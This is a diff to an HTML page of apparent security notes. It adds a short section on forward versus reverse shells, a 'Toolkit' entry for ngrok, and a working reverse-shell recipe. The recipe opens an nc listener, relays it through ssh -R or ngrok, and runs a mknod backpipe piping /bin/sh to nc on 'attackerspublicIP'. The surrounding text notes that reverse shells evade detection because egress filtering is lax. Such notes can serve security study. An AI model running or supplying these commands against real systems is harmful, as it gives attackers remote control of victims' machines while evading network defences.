@@ -179,6 +179,11 @@
   <ul>
     <li><a href="#network">Network</a></li>
     <li><a href="#elastic">Elastic</a></li>
+    <li><a href="#toolkit">Toolkit</a>
+      <ul>
+        <li><a href="#ngrok">ngrok</a></li>
+      </ul>
+    </li>
   </ul>
 </nav>
  </aside>
@@ -229,8 +234,20 @@
 
   <div class="content" itemprop="articleBody">
     <h2 id="network">Network</h2>
-<p>You will need pcap files for that: <a href="https://www.activecountermeasures.com/free-tools/rita/">https://www.activecountermeasures.com/free-tools/rita/</a></p>
-<h2 id="elastic">Elastic</h2>
+<p>You will need pcap files for that: <a href="https://www.activecountermeasures.com/free-tools/rita/">https://www.activecountermeasures.com/free-tools/rita/</a>.
+Forward: attacker connects to the victim. Reverse: victim connects to the attacker (harder to detect). Usually, ingress traffic is highly restrictive, unlike the egress one. That&rsquo;s why it&rsquo;s stealthier to use a reverse shell.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># On attacker&#39;s machine</span>
+</span></span><span class="line"><span class="cl">nc -l <span class="m">1234</span> <span class="c1"># open the listener (attacker&#39;s machine)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># optionally relay this listener to another service.</span>
+</span></span><span class="line"><span class="cl">ssh -R 1234:localhost:1234 relay@relay <span class="c1"># or..</span>
+</span></span><span class="line"><span class="cl">ngrok tcp <span class="m">1234</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># On the victim&#39;s machine (most likely, remotely)</span>
+</span></span><span class="line"><span class="cl">mknod /tmp/backpipe p<span class="p">;</span> /bin/sh 0&lt;/tmp/backpipe <span class="p">|</span> nc attackerspublicIP <span class="m">1234</span> 1&gt;/tmp/backpipe
+</span></span></code></pre></div><h2 id="elastic">Elastic</h2>
+<h2 id="toolkit">Toolkit</h2>
+<h3 id="ngrok">ngrok</h3>
+<p>Exposes the port to the interenet. Used when IP is private.</p>
 
   </div>
 </article>
